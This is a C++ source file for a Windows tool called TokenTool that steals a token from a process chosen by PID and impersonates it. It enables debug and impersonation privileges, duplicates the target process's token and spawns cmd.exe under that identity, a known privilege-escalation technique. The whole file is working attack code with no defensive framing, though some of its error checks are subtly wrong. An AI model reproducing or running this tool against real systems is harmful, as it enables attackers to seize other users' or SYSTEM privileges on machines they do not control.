#include <windows.h>
#include <iostream>
#include <Lmcons.h>




BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp),
		NULL, NULL)) {
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

int main(int argc, char** argv) 
{
	printf("TokenTool.exe v1.0\n");




	printf("[+] Current user is: %s\n", (get_username()).c_str());

	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);


	

	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	HANDLE currentTokenHandle = NULL;

	HANDLE processHandle = INVALID_HANDLE_VALUE;


	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle))
	{
		printf("[-] OpenProcessToken(GetCurrentProcess) Gle: %i\n", GetLastError());
		goto done;
	}
	else
	{
		printf("OpenProcessToken(GetCurrentProcess) succeeded.\n");
	}

	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME, TRUE))
	{
		printf("SetPrivilege error: %u\n", GetLastError());
		goto done;
	}
	else
	{
		printf("Enabled Debug\n");
	}

	if (!SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME, TRUE)) 
	{
		printf("SetPrivilege error: %u\n", GetLastError());
		goto done;
	}
	else
	{
		printf("Enabled Impersonate\n");
	}

	if (!SetPrivilege(currentTokenHandle, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE))
	{
		printf("SetPrivilege error: %u\n", GetLastError());
		goto done;
	}
	else
	{
		printf("Enabled Impersonate\n");
	}
	

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, true, PID_TO_IMPERSONATE);
	if (INVALID_HANDLE_VALUE == processHandle)
	{
		processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, true, PID_TO_IMPERSONATE);
		if (INVALID_HANDLE_VALUE == processHandle)
		{


			printf("[-] OpenProcess() Gle: %i\n", GetLastError());
			goto done;
		}
	}
	else
	{
		printf("OpenProcess(PID_2_IMP) succeeded.\n");
	}

	// TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY
	if (!OpenProcessToken(processHandle, MAXIMUM_ALLOWED , &tokenHandle))
	{
		if (!OpenProcessToken(processHandle, MAXIMUM_ALLOWED | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle))
		{

			printf("[-] OpenProcessToken(PID_TO_IMPERSONATE) Gle: %i\n", GetLastError());
			goto done;
		}
	}
	else
	{
		printf("OpenProcessToken(PID_TO_IMPERSONATE) succeeded.\n");
	}
	

	
	if (ImpersonateLoggedOnUser(tokenHandle))
	{
		printf("[+] ImpersonateLoggedOnUser() success!\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonateLoggedOnUser() Gle: %i\n", GetLastError());
		goto done;
	}
	
	if (!DuplicateTokenEx(tokenHandle, 
		MAXIMUM_ALLOWED |
		TOKEN_ALL_ACCESS | 
		TOKEN_ADJUST_DEFAULT | 
		TOKEN_ADJUST_SESSIONID | 
		TOKEN_QUERY | 
		TOKEN_DUPLICATE | 
		TOKEN_ASSIGN_PRIMARY, NULL, 
		SecurityImpersonation, TokenPrimary, &duplicateTokenHandle))
	{
		printf("[-] DuplicateTokenEx() Gle: %i\n", GetLastError());
		goto done;
	}

	if(!CreateProcessWithTokenW(duplicateTokenHandle, 
		LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation))
	{
		printf("[-] CreateProcessWithTokenW gle: %i\n", GetLastError());
		goto done;
	}

	done:

	printf("Done.\n");
	return 0;
}